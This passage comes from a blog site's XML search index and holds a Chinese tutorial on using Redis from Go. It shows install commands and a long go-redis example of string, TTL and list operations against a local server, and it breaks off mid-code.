<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Go快速上手--数据存储（redis,mysql,mongodb）</title>
    <link href="/2021/05/16/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8-redis-mysql-mongodb/"/>
    <url>/2021/05/16/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8-redis-mysql-mongodb/</url>
    
    <content type="html"><![CDATA[<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p>安装和启动Redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install redis-server</span><br><span class="line"></span><br><span class="line">sudo service redis-server start</span><br><span class="line"></span><br><span class="line">go get github.com&#x2F;go-redis&#x2F;redis&#x2F;v8</span><br></pre></td></tr></table></figure><p>通过cli连接redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379 </span><br></pre></td></tr></table></figure><p>redis 五大数据结构:</p><p><img src="/2021/05/16/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8-redis-mysql-mongodb/1.png" alt="image"></p><p>redis五大数据结构的使用实践案例如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/go-redis/redis/v8&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ctx = context.Background()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">rdb := redis.NewClient(&amp;redis.Options&#123;</span><br><span class="line">Addr:     <span class="string">&quot;127.0.0.1:6379&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;&quot;</span>,</span><br><span class="line">DB:       <span class="number">0</span>,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">pong, err := rdb.Ping(ctx).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;连接redis出错，错误信息：%v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;成功连接redis,&quot;</span>, pong)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ======================key val get set============================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set key val操作</span></span><br><span class="line">err = rdb.Set(ctx, <span class="string">&quot;guid&quot;</span>, <span class="string">&quot;89_1909979_2232118&quot;</span>, <span class="number">0</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis set失败，错误信息：%v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get key val操作</span></span><br><span class="line">val, err := rdb.Get(ctx, <span class="string">&quot;guid&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis get失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis get成功，key：%s, val:%s\n&quot;</span>, <span class="string">&quot;guid&quot;</span>, val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除一个key</span></span><br><span class="line">err = rdb.Del(ctx, <span class="string">&quot;guid&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis Del失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis Del成功，key：%s\n&quot;</span>, <span class="string">&quot;guid&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">val, err = rdb.Get(ctx, <span class="string">&quot;guidxx&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis get失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis get成功，key：%s, val:%s\n&quot;</span>, <span class="string">&quot;guidxx&quot;</span>, val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set key val NX, key不存在才set, 并设置指定过期时间</span></span><br><span class="line">err = rdb.SetNX(ctx, <span class="string">&quot;task&quot;</span>, <span class="string">&quot;123&quot;</span>, <span class="number">10</span>*time.Second).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis SetNX失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">time.Sleep(time.Duration(<span class="number">1</span>)*time.Second)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取过期剩余时间</span></span><br><span class="line">tm, err := rdb.TTL(ctx, <span class="string">&quot;task&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis TTL失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis TTL成功，key：%s, tm:%v\n&quot;</span>, <span class="string">&quot;task&quot;</span>, tm)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">val, err = rdb.Get(ctx, <span class="string">&quot;task&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis get失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis get成功，key：%s, val:%s\n&quot;</span>, <span class="string">&quot;task&quot;</span>, val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">time.Sleep(time.Duration(<span class="number">11</span>)*time.Second)</span><br><span class="line"></span><br><span class="line">val, err = rdb.Get(ctx, <span class="string">&quot;task&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis get失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis get成功，key：%s, val:%s\n&quot;</span>, <span class="string">&quot;task&quot;</span>, val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对key设置newValue这个值，并且返回key原来的旧值。原子操作。</span></span><br><span class="line">oldVal, err := rdb.GetSet(ctx, <span class="string">&quot;task&quot;</span>, <span class="string">&quot;456&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis GetSet失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis GetSet成功，key：%s, oldVal:%s\n&quot;</span>, <span class="string">&quot;task&quot;</span>, oldVal)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 批量get set</span></span><br><span class="line">err = rdb.MSet(ctx, <span class="string">&quot;key1&quot;</span>, <span class="string">&quot;val1&quot;</span>, <span class="string">&quot;key2&quot;</span>, <span class="string">&quot;val2&quot;</span>, <span class="string">&quot;key3&quot;</span>, <span class="string">&quot;val3&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis MSet失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">vals, err := rdb.MGet(ctx, <span class="string">&quot;key1&quot;</span>, <span class="string">&quot;key2&quot;</span>, <span class="string">&quot;key3&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis MGet失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis MGet成功，vals：%v\n&quot;</span>, vals)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自增自减，原子操作</span></span><br><span class="line">err = rdb.Incr(ctx, <span class="string">&quot;age&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis Incr失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// +5</span></span><br><span class="line">err = rdb.IncrBy(ctx, <span class="string">&quot;age&quot;</span>, <span class="number">5</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis IncrBy失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = rdb.Decr(ctx, <span class="string">&quot;age&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redisDecr失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// -3</span></span><br><span class="line">err = rdb.DecrBy(ctx, <span class="string">&quot;age&quot;</span>, <span class="number">3</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis DecrBy失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line">val, err = rdb.Get(ctx, <span class="string">&quot;age&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis get失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis get成功，key：%s, val:%s\n&quot;</span>, <span class="string">&quot;age&quot;</span>, val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对key设置过期时间</span></span><br><span class="line">rdb.Expire(ctx, <span class="string">&quot;key1&quot;</span>, <span class="number">3</span>*time.Second)</span><br><span class="line"></span><br><span class="line">tm, err = rdb.TTL(ctx, <span class="string">&quot;key1&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis TTL失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis TTL成功，key：%s, tm:%v\n&quot;</span>, <span class="string">&quot;key1&quot;</span>, tm)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//批量删除</span></span><br><span class="line">err = rdb.Del(ctx, <span class="string">&quot;key1&quot;</span>, <span class="string">&quot;key2&quot;</span>, <span class="string">&quot;key3&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis Del失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// =====================list=============================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LPushX 从左往右插入</span></span><br><span class="line"><span class="comment">// //仅当列表存在的时候才插入数据,此时列表不存在，无法插入</span></span><br><span class="line">err = rdb.LPushX(ctx, <span class="string">&quot;uids&quot;</span>, <span class="number">120</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LPushX失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /此时列表不存在，依然可以插入</span></span><br><span class="line">err = rdb.LPush(ctx, <span class="string">&quot;uids&quot;</span>, <span class="number">130</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LPush失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 批量插入</span></span><br><span class="line">err = rdb.LPushX(ctx, <span class="string">&quot;uids&quot;</span>, <span class="number">130</span>, <span class="number">140</span>, <span class="number">154</span>, <span class="number">132</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LPush失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回全部数据</span></span><br><span class="line">vals2, err := rdb.LRange(ctx, <span class="string">&quot;uids&quot;</span>, <span class="number">0</span>, <span class="number">-1</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LRange失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LRange成功，key：%s, vals:%v\n&quot;</span>, <span class="string">&quot;uids&quot;</span>, vals2)  <span class="comment">// redis LRange成功，key：uids, vals:[132 154 140 130 130]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取队列[2,4]的数据，即第3，4，5位置数据</span></span><br><span class="line">vals2, err = rdb.LRange(ctx, <span class="string">&quot;uids&quot;</span>, <span class="number">2</span>, <span class="number">4</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LRange失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LRange成功，key：%s, vals:%v\n&quot;</span>, <span class="string">&quot;uids&quot;</span>, vals2)  <span class="comment">// redis LRange成功，key：uids, vals:[140 130 130]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回队列长度</span></span><br><span class="line">llen, err := rdb.LLen(ctx, <span class="string">&quot;uids&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LLen失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LLen成功，key：%s, llen:%v\n&quot;</span>, <span class="string">&quot;uids&quot;</span>, llen)  <span class="comment">// redis LLen成功，key：uids, llen:5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改list中指定位置的值</span></span><br><span class="line">err = rdb.LSet(ctx, <span class="string">&quot;uids&quot;</span>, <span class="number">2</span>, <span class="number">1000</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LSet失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回全部数据</span></span><br><span class="line">vals2, err = rdb.LRange(ctx, <span class="string">&quot;uids&quot;</span>, <span class="number">0</span>, <span class="number">-1</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LRange失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LRange成功，key：%s, vals:%v\n&quot;</span>, <span class="string">&quot;uids&quot;</span>, vals2)  <span class="comment">//redis LRange成功，key：uids, vals:[132 154 1000 130 130]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 出队列，左进右出</span></span><br><span class="line">err = rdb.RPop(ctx, <span class="string">&quot;uids&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis RPop失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vals2, err = rdb.LRange(ctx, <span class="string">&quot;uids&quot;</span>, <span class="number">0</span>, <span class="number">-1</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LRange失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LRange成功，key：%s, vals:%v\n&quot;</span>, <span class="string">&quot;uids&quot;</span>, vals2) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 出队列，左进右出。没有就会阻塞，可以设置阻塞超时值</span></span><br><span class="line">err = rdb.BRPop(ctx, time.Duration(<span class="number">1</span>)*time.Second, <span class="string">&quot;uids&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis BRPop失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除一定位置范围内的值。删除count个key的list中值为value 的元素。如果出现重复元素，仅删除1次，也就是删除第一个</span></span><br><span class="line">err = rdb.LRem(ctx, <span class="string">&quot;uids&quot;</span>, <span class="number">3</span>, <span class="number">130</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LRem失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回全部数据</span></span><br><span class="line">vals2, err = rdb.LRange(ctx, <span class="string">&quot;uids&quot;</span>, <span class="number">0</span>, <span class="number">-1</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> 